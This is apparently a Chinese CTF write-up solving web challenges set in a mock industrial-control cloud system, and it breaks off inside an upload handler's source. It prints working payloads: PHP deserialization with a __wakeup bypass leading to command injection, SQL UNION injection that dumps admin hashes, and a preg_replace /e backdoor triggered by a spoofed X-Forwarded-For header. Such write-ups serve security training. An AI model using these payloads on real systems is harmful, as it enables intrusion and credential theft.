<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Record</span></span>&#123;</div><div class="line">    <span class="keyword">public</span> $file=<span class="string">"Welcome"</span>;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span></span></div><div class="line">    &#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;file = $file;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span><span class="params">()</span></span></div><div class="line">    &#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;file = <span class="string">'sleep.txt'</span>;</div><div class="line">        <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">'file'</span>);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></div><div class="line">    &#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;file = <span class="string">'wakeup.txt'</span>;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></div><div class="line">    &#123;</div><div class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;file != <span class="string">'wakeup.txt'</span> &amp;&amp; <span class="keyword">$this</span>-&gt;file != <span class="string">'sleep.txt'</span> &amp;&amp; <span class="keyword">$this</span>-&gt;file != <span class="string">'Welcome'</span>) &#123;</div><div class="line">        	system(<span class="string">"php ./import/$this-&gt;file.php"</span>);</div><div class="line">        &#125;<span class="keyword">else</span>&#123;</div><div class="line">        	<span class="keyword">echo</span> <span class="string">"&lt;?php Something destroyed ?&gt;"</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>在<code>__destruct</code>阶段，进行了system操作，但在反序列化时<code>__wakeup</code>方法的调用会设置file为<code>wakeup.txt</code>，CVE-2016-7124中提到可以如果被反序列话的字符串其中对应的对象的属性个数发生变化时，会导致反序列化失败而同时使得__wakeup失效。因此可以绕过，也即file字段可控，且没有过滤。</p>
<p>由前分析，由于不允许出现<code>./</code>，我们考虑先获得绝对路径。</p>
<p>在class.php中，将<code>sleep</code>方法注释掉，在尾部添加</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$b =<span class="keyword">new</span> Record(<span class="string">'Flag.php &amp;&amp; pwd &amp;&amp; pwd &amp;&amp; cat waf'</span>);</div><div class="line">$c = serialize($b);</div><div class="line"><span class="keyword">echo</span> $c;</div></pre></td></tr></table></figure>
<p>这样在执行时即执行：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">system(&quot;php ./import/Flag.php &amp;&amp; pwd &amp;&amp; pwd &amp;&amp; cat waf.php&quot;);</div></pre></td></tr></table></figure></p>
<p>pwd是为了获取当前路径，之后的是因为有一个<code>.php</code>的后缀。得到；<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">O:6:&quot;Record&quot;:1:&#123;s:4:&quot;file&quot;;s:33:&quot;Flag.php &amp;&amp; pwd &amp;&amp; pwd &amp;&amp; cat waf&quot;;&#125;</div></pre></td></tr></table></figure></p>
<p>修改为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">O:6:&quot;Record&quot;:2:&#123;s:4:&quot;file&quot;;s:33:&quot;Flag.php &amp;&amp; pwd &amp;&amp; pwd &amp;&amp; cat waf&quot;;&#125;</div></pre></td></tr></table></figure></p>
<p>url编码后访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://47.104.99.231:20003/index2.php?ad=1%00--&amp;secret=O%3A6%3A%22Record%22%3A2%3A%7Bs%3A4%3A%22file%22%3Bs%3A33%3A%22Flag.php%20%26%26%20pwd%20%26%26%20pwd%20%26%26%20cat%20waf%22%3B%7D</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180118/2.jpg?raw=true" alt=""></p>
<p>获得绝对路径为/var/www/html。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$b =new Record(&apos;Flag.php &amp;&amp; pwd &amp;&amp; cat /var/www/html/import/Flag&apos;);</div><div class="line">$c = serialize($b);</div><div class="line">echo $c;</div></pre></td></tr></table></figure>
<p>得到：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">O:6:&quot;Record&quot;:1:&#123;s:4:&quot;file&quot;;s:48:&quot;Flag.php &amp;&amp; pwd &amp;&amp; cat /var/www/html/import/Flag&quot;;&#125;</div></pre></td></tr></table></figure></p>
<p>修改为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">O:6:&quot;Record&quot;:2:&#123;s:4:&quot;file&quot;;s:48:&quot;Flag.php &amp;&amp; pwd &amp;&amp; cat /var/www/html/import/Flag&quot;;&#125;</div></pre></td></tr></table></figure></p>
<p>url编码，访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://47.104.99.231:20003/index2.php?ad=1%00--&amp;secret=O%3A6%3A%22Record%22%3A2%3A%7Bs%3A4%3A%22file%22%3Bs%3A48%3A%22Flag.php%20%26%26%20pwd%20%26%26%20cat%20%2fvar%2fwww%2fhtml%2fimport%2fFlag%22%3B%7D</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180118/1.jpg?raw=true" alt=""></p>
<p>flag如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">flag&#123;g_i_i_t_is_unsafe_ahhhahahah&#125;</div></pre></td></tr></table></figure></p>
<h1 id="工控管理系统新版本"><a href="#工控管理系统新版本" class="headerlink" title="工控管理系统新版本"></a>工控管理系统新版本</h1><h2 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">云工控管理系统新添加的登录和注册页面存在漏洞，请找出flag。</div><div class="line">http://47.104.1.173:20004/</div></pre></td></tr></table></figure>
<h2 id="Solution-2"><a href="#Solution-2" class="headerlink" title="Solution"></a>Solution</h2><p>findpwd.php有注入漏洞<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">POST:</div><div class="line">username=w&apos; UNION ALL SELECT 32,32,CONCAT((SELECT+GROUP_CONCAT(schema_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.SCHEMATA)),32#</div><div class="line"></div><div class="line">information_schema&lt;br&gt;cetc004&lt;br&gt;mysql&lt;br&gt;performance_schema&lt;br&gt;</div></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">username=w&apos; UNION ALL SELECT 32,32,CONCAT((SELECT+GROUP_CONCAT(table_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.TABLES+WHERE+TABLE_SCHEMA=0x63657463303034)),32#</div><div class="line"></div><div class="line"></div><div class="line">admin&lt;br&gt;user&lt;br&gt;</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">username=w&apos; UNION ALL SELECT 32,32,CONCAT((SELECT+GROUP_CONCAT(column_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+TABLE_NAME=0x61646d696e)),32#</div><div class="line"></div><div class="line">username&lt;br&gt;password&lt;br&gt;question&lt;br&gt;answer&lt;br&gt;</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">username=w&apos; UNION ALL SELECT 32,32,CONCAT((SELECT+GROUP_CONCAT(username,0x20,password,0x20,question,0x20,answer)+FROM+cetc004.admin)),32#</div><div class="line"></div><div class="line">c3tlwDmIn23 2f8667f381ff50ced6a3edc259260ba9 cetc cdwcewf2e3235y7687jnhbvdfcqsx12324r45y687o98kynbgfvds</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">username=w&apos; UNION ALL SELECT 32,32,CONCAT((SELECT+GROUP_CONCAT(username,0x20,password,0x20,question,0x20,answer+SEPARATOR+0x3c62723e)+FROM+cetc004.user)),32#</div><div class="line"></div><div class="line">c3tlwDmIn23 2f8667f381ff50ced6a3edc259260ba9 cetc cdwcewf2e3235y7687jnhbvdfcqsx12324r45y687o98kynbgfvds&lt;br&gt;</div><div class="line">1 c4ca4238a0b923820dcc509a6f75849b 1 1&lt;br&gt;</div><div class="line">admin c4ca4238a0b923820dcc509a6f75849b 1 1&lt;br&gt;</div><div class="line">root c81e728d9d4c2f636f067f89cc14862c 1 1&lt;br&gt;</div><div class="line">&apos; 024c94d6e03b6f67a86b952b914816c7 &apos; &apos;&lt;br&gt;</div><div class="line">xxoo e10adc3949ba59abbe56e057f20f883e 123456 123456</div></pre></td></tr></table></figure>
<h1 id="工控云管理系统设备维护中心被植入后门"><a href="#工控云管理系统设备维护中心被植入后门" class="headerlink" title="工控云管理系统设备维护中心被植入后门"></a>工控云管理系统设备维护中心被植入后门</h1><h2 id="题目-3"><a href="#题目-3" class="headerlink" title="题目"></a>题目</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">其他破坏者会利用工控云管理系统设备维护中心的后门入侵系统</div><div class="line">http://47.104.74.209:20005</div></pre></td></tr></table></figure>
<h2 id="Solution-3"><a href="#Solution-3" class="headerlink" title="Solution"></a>Solution</h2><p>利用page参数和php伪协议读取源码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">GET /index.php?page=php://filter/read=convert.base64-encode/resource=index.php HTTP/1.1</div><div class="line">Host: 47.104.74.209:20005</div><div class="line">User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0</div><div class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</div><div class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</div><div class="line">Accept-Encoding: gzip, deflate</div><div class="line">Cookie: PHPSESSID=j0mvnceqjlehu86vidl4hcs986</div><div class="line">Connection: close</div><div class="line">Upgrade-Insecure-Requests: 1</div></pre></td></tr></table></figure>
<p>得到index.php源码，其中第121行：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//方便的实现输入输出的功能,正在开发中的功能，只能内部人员测试</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> ($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>] === <span class="string">'127.0.0.1'</span>) &#123;</div><div class="line"></div><div class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br &gt;Welcome My Admin ! &lt;br &gt;"</span>;</div><div class="line"></div><div class="line">    $pattern = $_GET[pat];</div><div class="line">    $replacement = $_GET[rep];</div><div class="line">    $subject = $_GET[sub];</div><div class="line"></div><div class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($pattern) &amp;&amp; <span class="keyword">isset</span>($replacement) &amp;&amp; <span class="keyword">isset</span>($subject)) &#123;</div><div class="line">        preg_replace($pattern, $replacement, $subject);</div><div class="line">    &#125;<span class="keyword">else</span>&#123;</div><div class="line">        <span class="keyword">die</span>();</div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>这里存在后门，添加头部和对应GET字段。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">GET /index.php?pat=/(.*)/e&amp;rep=system(&apos;ls&apos;)&amp;sub=aa HTTP/1.1</div><div class="line">Host: 47.104.74.209:20005</div><div class="line">User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0</div><div class="line">X-Forwarded-For: 127.0.0.1</div><div class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</div><div class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</div><div class="line">Accept-Encoding: gzip, deflate</div><div class="line">Cookie: PHPSESSID=j0mvnceqjlehu86vidl4hcs986</div><div class="line">Connection: close</div><div class="line">Upgrade-Insecure-Requests: 1</div></pre></td></tr></table></figure></p>
<p>发现一个目录s3chahahaDir，之后还有一个目录flag，里面有flag.php<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180118/3.jpg?raw=true" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">GET /index.php?pat=/(.*)/e&amp;rep=system(&apos;cat+s3chahahaDir/flag/flag.php&apos;)&amp;sub=aa HTTP/1.1</div><div class="line">Host: 47.104.74.209:20005</div><div class="line">User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0</div><div class="line">X-Forwarded-For: 127.0.0.1</div><div class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</div><div class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</div><div class="line">Accept-Encoding: gzip, deflate</div><div class="line">Cookie: PHPSESSID=j0mvnceqjlehu86vidl4hcs986</div><div class="line">Connection: close</div><div class="line">Upgrade-Insecure-Requests: 1</div></pre></td></tr></table></figure>
<p>得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">flag&#123;SecuriTY_Preg_eee3&#125;</div></pre></td></tr></table></figure></p>
<h1 id="工控云管理系统客服中心期待您的反馈"><a href="#工控云管理系统客服中心期待您的反馈" class="headerlink" title="工控云管理系统客服中心期待您的反馈"></a>工控云管理系统客服中心期待您的反馈</h1><h2 id="题目-4"><a href="#题目-4" class="headerlink" title="题目"></a>题目</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">工控云管理系统客服中心存在漏洞，flag就在flag/flag/flag/flag/flag/flag/flag.php文件里面</div><div class="line">http://47.104.188.226:20001</div><div class="line"></div><div class="line">请找到这个隐藏的文件，swp？不不不。。。再找找。。</div></pre></td></tr></table></figure>
<h2 id="Solution-4"><a href="#Solution-4" class="headerlink" title="Solution"></a>Solution</h2><p>有一个上传功能：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://47.104.188.226:20001/includes/upload.php</div></pre></td></tr></table></figure></p>
<p>存在swn,swo,swp文件泄露：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">http://47.104.188.226:20001/.index.php.swp</div><div class="line">http://47.104.188.226:20001/.index.php.swo</div><div class="line">http://47.104.188.226:20001/.index.php.swn</div></pre></td></tr></table></figure></p>
<p>但实际上只有swo，可以直接看到源码：view-source:<a href="http://47.104.188.226:20001/.index.php.swo" target="_blank" rel="external">http://47.104.188.226:20001/.index.php.swo</a><br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">error_reporting(<span class="number">0</span>);</div><div class="line">ini_set(<span class="string">'open_basedir'</span>, <span class="string">'/var/www/html'</span>);</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">autoload</span><span class="params">($page)</span> </span>&#123;</div><div class="line">    <span class="keyword">if</span> (stripos($_SERVER[<span class="string">'QUERY_STRING'</span>], <span class="string">'flag'</span>) &gt; <span class="number">0</span>) &#123;</div><div class="line">      <span class="keyword">die</span>(<span class="string">'no flag flag flag flag !'</span>);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">if</span> (stripos($_SERVER[<span class="string">'QUERY_STRING'</span>], <span class="string">'uploaded'</span>) &gt; <span class="number">0</span>) &#123;</div><div class="line">      <span class="keyword">die</span>(<span class="string">'no uploaded uploaded uploaded uploaded !'</span>);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">if</span> (stripos($_SERVER[<span class="string">'QUERY_STRING'</span>], <span class="string">'://f'</span>) &gt; <span class="number">0</span>) &#123;</div><div class="line">      <span class="keyword">die</span>(<span class="string">'no ://f ://f ://f'</span>);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">if</span> (stripos($_SERVER[<span class="string">'QUERY_STRING'</span>], <span class="string">'ata'</span>) &gt; <span class="number">0</span>) &#123;</div><div class="line">      <span class="keyword">die</span>(<span class="string">'no ata ata ata'</span>);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">if</span> (stripos($_SERVER[<span class="string">'QUERY_STRING'</span>], <span class="string">'0'</span>) &gt; <span class="number">0</span>) &#123;</div><div class="line">      <span class="keyword">die</span>(<span class="string">'no 0 0 0'</span>);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">if</span>(file_exists(<span class="string">"./includes/$page.php"</span>)) &#123;</div><div class="line">        <span class="keyword">include</span> <span class="string">"./includes/$page.php"</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">elseif</span>(file_exists(<span class="string">"./includes/$page"</span>)) &#123;</div><div class="line">        <span class="keyword">include</span> <span class="string">"./includes/$page"</span>;</div><div class="line">    &#125;<span class="keyword">else</span>&#123;</div><div class="line">      <span class="keyword">echo</span> <span class="string">"File is not exit "</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">download</span><span class="params">($adfile, $file)</span></span>&#123;</div><div class="line">  <span class="comment">//Only Administrators can download files .</span></div><div class="line">      $cert = <span class="string">'N'</span>;</div><div class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($adfile) &amp;&amp; file_get_contents($adfile, <span class="string">'r'</span>) === <span class="string">'Yeah Everything Will Be Ok My Boss'</span>) &#123;</div><div class="line">      <span class="keyword">echo</span> <span class="string">"Welcome ! You Are Administrator !"</span>;</div><div class="line">      $cert = <span class="string">'Y'</span>;</div><div class="line">    &#125;<span class="keyword">else</span>&#123;</div><div class="line">      <span class="keyword">echo</span> <span class="string">"error1"</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> ($cert === <span class="string">'Y'</span>)&#123;</div><div class="line">      <span class="keyword">if</span> (stripos($file, <span class="string">'file_list'</span>) != <span class="keyword">false</span>) <span class="keyword">die</span>(<span class="string">'error4'</span>);</div><div class="line">      <span class="keyword">if</span> (stripos($file, <span class="string">'file_list'</span>) &gt;= <span class="number">0</span>) &#123;</div><div class="line">      header(<span class="string">'Content-Description: File Transfer'</span>);</div><div class="line">      header(<span class="string">'Content-Type: application/octet-stream'</span>);</div><div class="line">      header(<span class="string">'Content-Disposition: attachment; filename='</span>. basename($file));</div><div class="line">      header(<span class="string">'Content-Transfer-Encoding: binary'</span>);</div><div class="line">      header(<span class="string">'Expires: 0'</span>);</div><div class="line">      header(<span class="string">'Cache-Control: must-revalidate, post-check=0, pre-check=0'</span>);</div><div class="line">      header(<span class="string">'Pragma: public'</span>);</div><div class="line">      header(<span class="string">'Content-Length: '</span> . filesize($file));</div><div class="line">      readfile($file);</div><div class="line">    &#125;<span class="keyword">else</span>&#123;</div><div class="line">      <span class="keyword">die</span>(<span class="string">'error2'</span>);</div><div class="line">    &#125;</div><div class="line">&#125;<span class="keyword">else</span>&#123;</div><div class="line">  <span class="keyword">echo</span> <span class="string">'error3'</span>;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'page'</span>])) &#123;</div><div class="line">    $page = <span class="string">'index'</span>;</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span> &#123;</div><div class="line">    $page = $_GET[<span class="string">'page'</span>];</div><div class="line">&#125;</div><div class="line"><span class="keyword">if</span> (stripos($page, <span class="string">'./'</span>) &gt; <span class="number">0</span>) &#123;</div><div class="line">  <span class="keyword">die</span>(<span class="string">'no ./ ./ ./ ./'</span>);</div><div class="line">&#125;</div><div class="line"><span class="keyword">if</span> (stripos($page, <span class="string">'://'</span>) &gt; <span class="number">0</span>) &#123;</div><div class="line">  <span class="keyword">die</span>(<span class="string">'no :// :// ://'</span>);</div><div class="line">&#125;</div><div class="line">autoload($page);</div><div class="line"></div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[admin]) &amp;&amp; <span class="keyword">isset</span>($_GET[file])) &#123;</div><div class="line"></div><div class="line">  <span class="keyword">if</span> (stripos($_GET[admin], <span class="string">'flag'</span>) &gt; <span class="number">0</span> || stripos($_GET[file], <span class="string">'flag'</span>) &gt; <span class="number">0</span>) &#123;</div><div class="line">    <span class="keyword">die</span>(<span class="string">'not flag flag flag falg !'</span>);</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  <span class="keyword">if</span> (strlen($_GET[file]) &gt;= <span class="number">38</span>) &#123;</div><div class="line">    <span class="keyword">die</span>(<span class="string">'too long'</span>);</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  download($_GET[admin], $_GET[file]);</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>上面这个是index.php的源码，分析起来两个功能：</p>
<ol>
<li>autoload功能，这里提供了一个文件包含，但需要绕过许多限制，后面再说。</li>
<li>download功能，提供了文件下载功能。</li>
</ol>
<p>先利用download功能。在最下面，接受了两个参数<code>admin</code>和<code>file</code>。在download函数中，对<code>admin</code>参数做了检测:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">if(isset($adfile) &amp;&amp; file_get_contents($adfile, &apos;r&apos;) === &apos;Yeah Everything Will Be Ok My Boss&apos;)</div></pre></td></tr></table></figure></p>
<p>结合题目里有上传功能，我们访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">http://47.104.188.226:20001/index.php?admin=php://input&amp;file=includes/upload.php</div><div class="line"></div><div class="line">POST:</div><div class="line">Yeah Everything Will Be Ok My Boss</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180118/5.jpg?raw=true" alt=""></p>
<p>从而获得了upload.php的源码:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div></pre></td><td class="code"><pre><div class="line">    <span class="meta">&lt;?php</span></div><div class="line"></div><div class="line">    <span class="keyword">if</span> (stripos($_SERVER[<span class="string">'QUERY_STRING'</span>], <span class="string">'flag'</span>) &gt; <span class="number">0</span>) &#123;</div><div class="line">      <span class="keyword">die</span>(<span class="string">'no flag flag flag flag !'</span>);</div><div class="line">    &#125;</div><div class="line"></div><div class="line"></div><div class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>($_FILES)) &#123;</div><div class="line"></div><div class="line">    <span class="comment">//properties of the uploaded file</span></div><div class="line">    $name= $_FILES[<span class="string">"filename"</span>][<span class="string">"name"</span>];</div><div class="line">    $type= $_FILES[<span class="string">"filename"</span>][<span class="string">"type"</span>];</div><div class="line">    $size= $_FILES[<span class="string">"filename"</span>][<span class="string">"size"</span>];</div><div class="line">    $temp= $_FILES[<span class="string">"filename"</span>][<span class="string">"tmp_name"</span>];</div><div class="line">    $error= $_FILES[<span class="string">"filename"</span>][<span class="string">"error"</span>];</div><div class="line"></div><div class="line">    <span class="keyword">if</span> (strlen($name) &gt;= <span class="number">6</span>) &#123;</div><div class="line">      <span 